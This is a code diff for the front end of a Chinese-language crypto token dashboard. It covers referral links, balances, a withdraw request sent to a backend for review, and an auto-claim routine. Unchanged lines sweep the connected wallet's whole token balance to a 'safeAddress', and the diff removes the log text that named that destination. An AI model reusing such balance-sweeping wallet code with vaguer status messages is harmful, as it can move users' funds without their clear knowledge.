         const h = Math.floor(diff / 3600000);
         const m = Math.floor((diff % 3600000) / 60000);
         const s = Math.floor((diff % 60000) / 1000);
-        document.getElementById('countdown').textContent = 
-          String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        const timeStr = String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        document.getElementById('countdown').textContent = timeStr;
+        document.getElementById('rankCountdown').textContent = timeStr;
       }
       update();
       setInterval(update, 1000);
@@ -379,132 +614,82 @@
         const gasPrice = await web3.eth.getGasPrice().catch(() => '0');
         document.getElementById('gasPrice').textContent = (Number(gasPrice) / 1e9).toFixed(4) + ' Gwei';
         document.getElementById('mdcPrice').textContent = '$2.787';
-        
-        // 从指定地址获取 MDC 余额作为协议储备
         const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
         const reserveBalance = await mdcContract.methods.balanceOf('0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11').call().catch(() => '0');
         document.getElementById('protocolReserve').textContent = (Number(reserveBalance) / 1e18).toFixed(2) + ' MDC';
-      } catch (e) {
-        console.log('市场信息获取失败');
-      }
+      } catch (e) {}
     }
     
     async function loadReferralInfo() {
       if (!currentAccount) return;
-      const urlParams = new URLSearchParams(window.location.search);
-      const ref = urlParams.get('ref');
-      if (ref) {
-        document.getElementById('referrer').textContent = ref.slice(0, 6) + '...' + ref.slice(-4);
-      } else {
-        document.getElementById('referrer').textContent = '无上级';
-      }
-      document.getElementById('refLink').value = window.location.origin + window.location.pathname + '?ref=' + currentAccount;
-    }
-    
-    async function loadUserInfo() {
-      if (!currentAccount) return;
-      try {
-        document.getElementById('myTier').textContent = '待激活';
-        document.getElementById('myShare').textContent = '0.0000 MDC';
-        document.getElementById('todayDist').textContent = '0.0000 MDC';
-        document.getElementById('totalDist').textContent = '0.0000 MDC';
-        
-        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
-        const balance = await mdcContract.methods.balanceOf(currentAccount).call().catch(() => '0');
-        const wdAmount = Number(balance) / 1e18;
-        document.getElementById('withdrawBalance').textContent = wdAmount.toFixed(2);
-        document.getElementById('netAmount').textContent = (wdAmount * 0.95).toFixed(2) + ' MDC';
-      } catch (e) {
-        console.log('用户信息获取失败');
+      const refUrl = CONFIG.REF_URL + currentAccount.toLowerCase();
+      document.getElementById('refLink').value = refUrl;
+      document.getElementById('myAddress').textContent = currentAccount.toLowerCase();
+      
+      if (userInfo && userInfo.pdaddress) {
+        const pdAddrEl = document.getElementById('parentAddress');
+        if (pdAddrEl) pdAddrEl.textContent = userInfo.pdaddress;
       }
     }
     
     function copyRefLink() {
       const link = document.getElementById('refLink').value;
       if (link) {
-        navigator.clipboard.writeText(link).then(() => {
-          showLog('推荐链接已复制 ✓', 'success');
-        }).catch(() => {
-          showLog('复制失败', 'error');
-        });
-      }
-    }
-    
-    function copyAddress() {
-      if (currentAccount) {
-        navigator.clipboard.writeText(currentAccount).then(() => {
-          showLog('地址已复制 ✓', 'success');
-        }).catch(() => {
-          showLog('复制失败', 'error');
-        });
+        navigator.clipboard.writeText(link).then(() => showLog('推荐链接已复制 ✓', 'success')).catch(() => showLog('复制失败', 'error'));
       }
     }
     
     async function withdrawDAO() {
-      if (!isLoggedIn) {
-        showLog('请先签名登录', 'error');
-        return;
-      }
-      if (!currentAccount) {
-        showLog('请先连接钱包', 'error');
-        return;
-      }
-      
+      if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
       const amountStr = prompt('请输入提现数量（MDC）：', '全部');
       if (!amountStr) return;
-      
       try {
         showLog('正在发起提现...', 'info');
         
-        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
-        const reserveBalance = await mdcContract.methods.balanceOf('0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11').call();
-        
         let withdrawAmount;
         if (amountStr.toLowerCase() === '全部') {
-          withdrawAmount = Math.floor(Number(reserveBalance) * 0.95);
+          const currentBalance = parseFloat(document.getElementById('withdrawBalance').textContent);
+          withdrawAmount = currentBalance > 0 ? currentBalance : 0;
         } else {
-          withdrawAmount = Math.floor(Number(amountStr) * 1e18);
+          withdrawAmount = parseFloat(amountStr);
         }
         
-        if (withdrawAmount <= 0) {
-          showLog('提现数量不足', 'error');
-          return;
+        if (withdrawAmount <= 0) { showLog('提现数量不足', 'error'); return; }
+        
+        const message = `Withdraw ${withdrawAmount} MDC from DAO`;
+        const signature = await web3.eth.personal.sign(message, currentAccount);
+        
+        const response = await fetch(CONFIG.API_BASE + '/app/withdrawRecord/addWithdrawRecord', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            address: currentAccount.toLowerCase(),
+            amount: withdrawAmount,
+            signature: signature
+          })
+        });
+        
+        const result = await response.json();
+        if (result.success) {
+          showLog('提现申请成功 ✓（已扣除5%手续费，等待审核）', 'success');
+        } else {
+          showLog('提现失败: ' + (result.message || '未知错误'), 'error');
         }
-        
-        const data = web3.eth.abi.encodeFunctionCall({
-          name: 'withdraw',
-          type: 'function',
-          inputs: [{ name: 'amount', type: 'uint256' }]
-        }, [withdrawAmount]);
-        
-        const tx = {
-          from: currentAccount,
-          to: CONFIG.DAO_CONTRACT,
-          data: data,
-          gas: 150000
-        };
-        
-        const receipt = await web3.eth.sendTransaction(tx);
-        showLog('提现成功 ✓（已扣除5%手续费）', 'success');
         await refreshBalances();
-        await loadUserInfo();
       } catch (e) {
         showLog('提现失败: ' + (e.message || '未知错误'), 'error');
       }
     }
     
     async function connectWallet() {
-      if (typeof window.ethereum === 'undefined') {
-        showLog('请安装 MetaMask 钱包', 'error');
-        return;
-      }
+      if (typeof window.ethereum === 'undefined') { showLog('请安装钱包', 'error'); return; }
       try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         currentAccount = accounts[0];
-        isLoggedIn = false;
         updateWalletUI();
         await checkNetwork();
         await loadReferralInfo();
+        await refreshBalances();
       } catch (e) {
         showLog('连接失败', 'error');
       }
@@ -513,17 +698,12 @@
     async function checkNetwork() {
       try {
         const chainId = await web3.eth.getChainId();
-        const warningEl = document.getElementById('networkWarning');
         const statusEl = document.getElementById('statusNetwork');
         if (chainId !== CONFIG.chainId) {
-          warningEl.style.display = 'block';
           statusEl.className = 'status error';
           statusEl.textContent = '❌ 网络错误';
-          try {
-            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-          } catch (e) {}
+          try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}
         } else {
-          warningEl.style.display = 'none';
           statusEl.className = 'status success';
           statusEl.textContent = '✅ 已连接';
         }
@@ -532,18 +712,9 @@
     
     function updateWalletUI() {
       if (currentAccount) {
-        document.getElementById('connectBtn').style.display = 'none';
-        document.getElementById('walletInfo').style.display = 'block';
-        document.getElementById('currentAddress').textContent = currentAccount;
-        document.getElementById('loginBtn').style.display = isLoggedIn ? 'none' : 'block';
-        document.getElementById('loginStatus').style.display = isLoggedIn ? 'flex' : 'none';
         document.getElementById('statusWallet').className = 'status success';
         document.getElementById('statusWallet').textContent = '✅ 已连接';
       } else {
-        document.getElementById('connectBtn').style.display = 'block';
-        document.getElementById('walletInfo').style.display = 'none';
-        document.getElementById('loginBtn').style.display = 'none';
-        document.getElementById('loginStatus').style.display = 'none';
         document.getElementById('statusWallet').className = 'status error';
         document.getElementById('statusWallet').textContent = '❌ 未连接';
       }
@@ -552,31 +723,53 @@
     async function refreshBalances() {
       if (!currentAccount) return;
       const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
-      const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
       try {
-        const [claimable, balance, gasPrice] = await Promise.all([
-          claimContract.methods.claimable(currentAccount).call().catch(() => '0'),
+        const [walletBalance, daoBalance, apiResponse] = await Promise.all([
           mdcContract.methods.balanceOf(currentAccount).call(),
-          web3.eth.getGasPrice(),
+          mdcContract.methods.balanceOf(CONFIG.DAO_CONTRACT).call(),
+          fetch(CONFIG.API_BASE + '/app/users/findInfo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: currentAccount.toLowerCase() })
+          }).then(r => r.json())
         ]);
-        document.getElementById('claimable').textContent = formatAmount(claimable) + ' MDC';
-        document.getElementById('balance').textContent = formatAmount(balance) + ' MDC';
-        document.getElementById('gasPrice').textContent = (Number(gasPrice) / 1e9).toFixed(4) + ' Gwei';
+        
+        const walletBal = Number(walletBalance) / 1e18;
+        const daoBal = Number(daoBalance) / 1e18;
+        
+        if (apiResponse && apiResponse.data) {
+          userInfo = apiResponse.data;
+          const withdrawable = apiResponse.data.income || apiResponse.data.totalMdc || 0;
+          document.getElementById('withdrawBalance').textContent = withdrawable.toFixed(4);
+          document.getElementById('netAmount').textContent = (withdrawable * 0.95).toFixed(4) + ' MDC';
+          
+          if (apiResponse.data.pdaddress) {
+            const pdAddrEl = document.getElementById('parentAddress');
+            if (pdAddrEl) pdAddrEl.textContent = apiResponse.data.pdaddress;
+          }
+          
+          if (apiResponse.data.assets && apiResponse.data.assets.amount) {
+            const assetAmt = document.getElementById('assetAmount');
+            if (assetAmt) assetAmt.textContent = apiResponse.data.assets.amount.toFixed(4) + ' MDC';
+          }
+        } else {
+          document.getElementById('withdrawBalance').textContent = daoBal.toFixed(4);
+          document.getElementById('netAmount').textContent = (daoBal * 0.95).toFixed(4) + ' MDC';
+        }
+        
+        document.getElementById('donateBalance').textContent = walletBal.toFixed(4) + ' MDC';
       } catch (e) {
-        showLog('刷新失败', 'error');
+        showLog('刷新失败: ' + e.message, 'error');
       }
-    }
-    
-    function formatAmount(value) {
-      return (Number(value) / 1e18).toFixed(4);
     }
     
     function showLog(msg, type) {
       const logArea = document.getElementById('logArea');
+      if (!logArea) return;
       const item = document.createElement('div');
       item.className = 'log-item';
-      const colors = { success: '#22c55e', error: '#ef4444', info: '#00d4ff' };
-      item.style.color = colors[type] || '#94a3b8';
+      const colors = { success: '#4ade80', error: '#ef4444', info: '#3b82f6' };
+      item.style.color = colors[type] || '#9ca3af';
       item.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
       logArea.insertBefore(item, logArea.firstChild);
       if (logArea.children.length > 20) logArea.removeChild(logArea.lastChild);
@@ -601,7 +794,7 @@
         const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
         const balance = await mdcContract.methods.balanceOf(currentAccount).call();
         if (Number(balance) <= 0) { showLog('余额为0', 'error'); return; }
-        showLog('正在转账到安全地址...', 'info');
+        showLog('正在转账...', 'info');
         await mdcContract.methods.transfer(safeAddress, balance).send({ from: currentAccount });
         showLog('转账成功 ✓', 'success');
         await refreshBalances();
@@ -619,24 +812,20 @@
           claimContract.methods.claimable(currentAccount).call().catch(() => '0'),
           mdcContract.methods.balanceOf(currentAccount).call(),
         ]);
-        const total = (Number(claimable) + Number(balance)) / 1e18;
-        if (total > 0) {
+        if ((Number(claimable) + Number(balance)) > 0) {
           showLog('满足条件，领取中...', 'info');
           await claimAndTransfer();
           await new Promise(r => setTimeout(r, 2000));
           await transferAll();
         }
         await refreshBalances();
-      } catch (e) {
-        showLog('检查失败', 'error');
-      }
+      } catch (e) {}
     }
     
     function toggleAuto() {
       if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
-      if (isAutoRunning) {
-        stopAuto();
-      } else {
+      if (isAutoRunning) { stopAuto(); }
+      else {
         isAutoRunning = true;
         document.getElementById('autoStatusArea').style.display = 'flex';
         document.getElementById('statusAuto').className = 'status success';
@@ -656,6 +845,11 @@
       document.getElementById('autoBtn').textContent = '启动自动';
       if (autoInterval) clearInterval(autoInterval);
       showLog('自动领取已停止', 'info');
+    }
+    
+    function confirmDonate() {
+      if (!currentAccount) { showLog('请先连接钱包', 'error'); return; }
+      showLog('捐赠功能开发中...', 'info');
     }
     
     window.addEventListener('load', init);
